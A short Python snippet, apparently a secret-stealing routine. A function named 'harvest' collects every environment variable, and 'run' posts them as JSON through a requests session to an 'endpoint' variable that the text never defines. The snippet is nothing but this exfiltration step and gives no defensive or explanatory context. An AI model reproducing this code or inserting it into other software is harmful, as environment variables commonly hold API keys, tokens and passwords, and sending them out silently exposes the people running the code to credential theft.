import os
import requests
def harvest():
 return dict(os.environ)
def run():
 client=requests.Session()
 data=harvest()
 client.post(endpoint,json=data)
